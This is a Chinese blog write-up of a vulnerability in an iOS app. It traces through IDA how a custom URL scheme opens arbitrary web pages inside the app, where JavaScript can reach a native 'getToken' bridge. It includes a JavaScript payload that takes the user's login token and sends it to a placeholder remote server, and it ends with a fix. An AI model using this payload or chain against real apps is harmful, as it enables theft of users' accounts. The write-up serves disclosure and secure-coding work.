---
title: 利用 URL Scheme 远程窃取用户 token
publish_date: 2020-08-06
---

### 什么是 URL Scheme？

- URL，我们都很清楚，`http://www.apple.com` 就是个 URL，我们也叫它链接或网址；
- Schemes，表示的是一个 URL 中的一个位置——最初始的位置，即 `://`之前的那段字符。比如 `http://www.apple.com` 这个网址的 `Schemes` 是 `http`；
- URL Scheme，`tel://10010` 则是一个最简单的 URL Scheme，通过这个 URL Scheme 可以在 iOS 设备任何应用中调起电话 App，并且拨打指定号码。

应用可以通过自定义的 URL Scheme 协议可以实现进程间通信，其具体表现为应用 A 可以通过 URL Scheme 调起应用 B，并且传入携带的参数。

首先查看应用已注册的 URL Scheme，可以在应用安装包 /info.plist 文件中查找。

![scheme_1.png](../url_scheme_attack_token/url_scheme_attack_token_1.png)

URL Scheme 回调函数：

```objective-c
// NS_DEPRECATED_IOS(2_0, 9_0, "Please use application:openURL:options:") __TVOS_PROHIBITED
- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url;

// NS_DEPRECATED_IOS(4_2, 9_0, "Please use application:openURL:options:") __TVOS_PROHIBITED
- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(nullable NSString *)sourceApplication annotation:(id)annotation;

// NS_AVAILABLE_IOS(9_0)
- (BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary<UIApplicationOpenURLOptionsKey, id> *)options;
```

如果外部通过 URL Scheme 调起客户端，那么一定会走这三个回调函数中的其中一个（跟 iOS 系统版本有关），所以我们就从这回调函数开始入手分析逻辑。

### 分析过程

应用二进制拖进 IDA ，接下来开始一步一步逆向分析代码

第一个当然是寻找 `[AppDelegate application:openURL:options:]` 方法：
![scheme_2.png](../url_scheme_attack_token/url_scheme_attack_token_2.png)

跟进 `+[AppSetupConf application:openURL:options:]` 方法：
![scheme_4.png](../url_scheme_attack_token/url_scheme_attack_token_3.png)

这个方法里面既调用了 `-[AppsFlyerTracker handleOpenUrl:options:]`，还调用了 `+[OKBLaunchHandler handleOpenURL:options:]` ，这个时候谷歌一下就可以确认，`AppsFlyerTracker` 是第三方统计、数据追踪的框架。

所以我们跟进 `+[OKBLaunchHandler handleOpenURL:options:]` 方法中：
![scheme_3.png](../url_scheme_attack_token/url_scheme_attack_token_4.png)

点击 `+[OKBLaunchHandler eventWithURL:type:]` 方法可以看到大概逻辑应该是做事件统计追踪的方法，所以我们继续跟进 `+[OKBLaunchHandler dispatchWithURL:coldLaunch:type:]` ，关键逻辑：
![scheme_5.png](../url_scheme_attack_token/url_scheme_attack_token_5.png)

接下来我们仔细分析下这段代码

首先变量 a3 是方法中第一个参数，通过方法名判断 a3 应该是我们传入的 URL Scheme，接着从代码 57 - 73 行，这部分是在判断传入 URL Scheme 的 scheme 是不是 http 或者 https，不满足条件时，继续执行；当满足条件时，直接 goto LABEL_15； 也就是直接结束该方法。

代码 74 - 78 行，判断了传入的 URL Scheme 是否存在 host，不存在则直接结束方法。

分析到这里，我们的 URL Scheme 大概应该是这样的：demo_scheme://xxx

接着代码 81 行调用了 `+[OKBLaunchHandler classWithHost:]` 方法，参数为我们传入 URL Scheme 的 host 字符串，并且还有一个返回值，跟进方法进行分析：
![scheme_6.png](../url_scheme_attack_token/url_scheme_attack_token_6.png)

这个方法看着一顿操作猛如虎，其实就是判断传入字符串是否包含 `_`，然后删除这个 `_`，最后赋值到变量 v21 把 `OKBLaunchEventHandler_` 和 v21 字符串拼接，然后判断这个类是否存在，如果存在，则返回这个类。

我们在 IDA Function View 里面搜索 ``OKBLaunchEventHandler_`，发现只可能拼接`Web`或者`MerchanthomeCom`：

![scheme_7.png](../url_scheme_attack_token/url_scheme_attack_token_7.png)

我们看到 `OKBLaunchEventHandler_Web` 有一个 `-[OKBLaunchEventHandler_Web openWebViewWithURL:]` 的方法，看起来可以打开传入的网页 URL。所以分析到这里，我们的 URL Scheme 暂时应该是这样的：`demo_scheme://web_?`。

继续分析 `+[OKBLaunchHandler dispatchWithURL:coldLaunch:type:]` 的 85 - 107 行代码：
![scheme_8.png](../url_scheme_attack_token/url_scheme_attack_token_8.png)

接着调用了 `+[OKBJSHandle analysisParamWithQuery:]` 方法，并将 URL Scheme 的参数当作此方法参数传入。其实该方法逻辑就是将 URL Scheme 的参数变成一个字典并且返回。紧接着调用 `-[OKBLaunchHandlerModel setParams:]` 将字典赋值到 `OKBLaunchHandlerModel` 的 `params` 属性中 。

接着 99 - 104 行代码是判断 `OKBLaunchEventHandler_Web` 是否实现了 `-[OKBLaunchEventHandler_Web handleLaunchEventWithModel:]` 方法，因为这个方法我们刚在 IDA Function View 中看到了，所以直接调用 `-[OKBLaunchEventHandler_Web handleLaunchEventWithModel:]`，此时参数是 `OKBLaunchHandlerModel` 对象，我们要记得这个对象是有一个 params 属性的，且刚被赋值。

此时我们暂且不管这个字典的内容应该是什么，暂且不管 URL Scheme 的参数部分如何构造，先继续分析代码。

跟进 `-[OKBLaunchEventHandler_Web handleLaunchEventWithModel:]` 方法：
![scheme_9.png](../url_scheme_attack_token/url_scheme_attack_token_9.png)

该方法逻辑比较简单，大概是判断传入 `OKBLaunchHandlerModel` 对象的 `params` 字典是否包括 `url` 键，如果包括的话，`url` 键对应的值是否以`http` 或者 `https` 开头，如果条件均满足，则调用 `-[OKBLaunchEventHandler_Web openWebViewWithURL:]`。

在 `-[OKBLaunchEventHandler_Web openWebViewWithURL:]` 中逻辑简单，直接打开了一个新的控制器，并且加载传入的 url。
![scheme_10.png](../url_scheme_attack_token/url_scheme_attack_token_10.png)

所以此时我们希望构造的 URL Scheme 格式为：`demo_scheme://web_?url=xxx`。

至此我们搞清楚了应用如何校验传入的 URL Scheme，并且我们应该如何构造 URL Scheme 可以打开自定义网页。

做到这一步我们先验证下之前的猜想，看看效果：

在 Safari 浏览器输入 `demo_scheme://web_?url=https://www.baidu.com`，Safari 调起应用并且打开了指定的 `https://www.baidu.com`：
![scheme_11.png](../url_scheme_attack_token/url_scheme_attack_token_11.png)

别急，现在我们只完成了漏洞利用分析的第一步。

接着我们来看下是否可以通过 js 调用应用的敏感接口。查看 `-[OKBWebViewController didReceiveScriptMessage:]` 方法，该方法是当 Native 收到 js 调用时的处理函数：
![scheme_12.png](../url_scheme_attack_token/url_scheme_attack_token_12.png)

此方法的参数是一个 `WKScriptMessage` 对象，该对象有一个 body 属性，body 就是 js 调用 Native 传入的参数。

通过分析伪代码可以看到进行了判断 body 的值是否是 `getToken` ，如果是的话，就调用 `-[OKBWebViewController p_callHandler:doSomeThing:completionHandler:]` 方法。

该方法三个参数，第一个是一个 js 传入的参数，也就是 `WKScriptMessage` 的 body 属性；第二个参数是一个代码块；第三个参数为空。

查看 `-[OKBWebViewController p_callHandler:doSomeThing:completionHandler:]` 函数实现：
![scheme_13.png](../url_scheme_attack_token/url_scheme_attack_token_13.png)

方法第二个参数（传入的代码块）被赋值到 v9，并且调用了这个代码块，返回值保存在了 v11。接着调用 `[[OKBWebViewController wkWebView] evaluateJavaScript:completionHandler:]`来执行 `iOS._callBack(xxx)` js 代码。此时我们需要确定 v11，也就是代码块的返回值到底是什么。代码块：
![scheme_14.png](../url_scheme_attack_token/url_scheme_attack_token_14.png)

这里可以看到是获取了用户的登录 token，并且返回；所以执行的 js 伪代码应该是 `iOS._callBack(用户token)`。

到这里我们搞清楚了如何通过 URL Scheme 调起自定义页面，知道了使用 js 调用 Native 如何传递参数，也知道了 Native 如何返回结果到 js 代码，所以我们就可以构造 js 代码来窃取用户的 token，并且发送到远程服务器。

js 代码：

```
<script type="text/javascript">
var action = "getToken";
window.webkit.messageHandlers.JShandle.postMessage(action);
var iOS = {
	_callBack:function ( action, param){
		var httpRequest = new XMLHttpRequest();
		httpRequest.open('GET', 'https://xxx/' + param, true);
		httpRequest.send();
	}
}
</script>
```

这样我们通过 URL Scheme 来调起网页就可以远程获取到用户的 token 了:
![scheme_15.png](../url_scheme_attack_token/url_scheme_attack_token_15.png)

但是这样还不够优雅，我们需要一个网页来调起应用，而不是手动在 Safari 中输入 URL Scheme，这样才可以达到远程攻击的效果。
![scheme_16.png](../url_scheme_attack_token/url_scheme_attack_token_16.png)

这样在用户浏览网页时，便可以自动通过 URL Scheme 调起应用，并且远程窃取用户的 token 发送到服务器。

### 漏洞思路 + 总结

#### 利用过程

首先需要应用注册 URL Scheme

通过 URL Scheme 可以调起攻击者的恶意网页

Natvive 暴露敏感接口供 js 调用

js 窃取用户敏感数据，发送到远程服务器

#### 漏洞成因

应用注册 URL Scheme 供外部调用，并且可以在应用内加载指定网页。

当应用加载攻击者指定网页后，应用未做严格鉴权，导致网页 js 代码调用了应用暴露的敏感 Native 函数。

#### 如何修复

当应用有通过 URL Scheme 调起并打开任意网页功能的需求时，需要对打开网页域名做严格过滤，当非白名单域名时，禁止 js 调用 Native 函数。